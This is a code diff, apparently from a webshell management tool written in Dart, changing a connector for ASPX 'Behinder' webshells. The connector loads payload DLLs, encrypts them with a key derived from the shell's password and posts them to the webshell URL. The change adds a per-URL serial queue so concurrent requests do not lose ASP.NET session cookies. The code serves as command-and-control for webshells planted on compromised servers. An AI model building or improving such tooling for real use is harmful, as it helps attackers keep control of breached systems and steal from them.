@@ -6,6 +6,7 @@ import 'dart:typed_data';
 import 'package:encrypt/encrypt.dart' as enc;
 import 'package:http/http.dart' as http;
 
+import '../core/async/serial_queue.dart';
 import '../core/asset_loader.dart';
 import '../core/crypto/behinder_crypto.dart';
 import '../models/file_entry.dart';
@@ -18,6 +19,9 @@ class AspxBehinderConnector extends ShellConnector {
 
   late final http.Client _client = http.Client();
   final Map<String, String> _cookies = {};
+
+  /// 同 URL 共享的串行队列：ASP.NET Session 并发会串号/丢 Cookie。
+  late final SerialQueue _sendQueue = SerialQueue.forKey(webshell.url);
   String? _lastPingDiagnostic;
 
   String get _key => BehinderCrypto.deriveKey(webshell.password);
@@ -45,7 +49,11 @@ class AspxBehinderConnector extends ShellConnector {
       final d = await _load(dll); if (d.isEmpty) return '[Error] $dll';
       final s = utf8.encode('~~~~~~${_params(p)}');
       final body = _enc(Uint8List(d.length + s.length)..setAll(0, d)..setAll(d.length, s));
-      final r = await _client.post(Uri.parse(webshell.url), headers: _h, body: body).timeout(const Duration(seconds: 10));
+      final r = await _sendQueue.run(
+        () => _client
+            .post(Uri.parse(webshell.url), headers: _h, body: body)
+            .timeout(const Duration(seconds: 10)),
+      );
       _ck(r); if (r.statusCode != 200) return '[HTTP ${r.statusCode}]';
       final dec = _decBytes(r.bodyBytes);
       return dec != null ? BehinderCrypto.extractResponse(dec) : decodeWithFallback(r.bodyBytes);
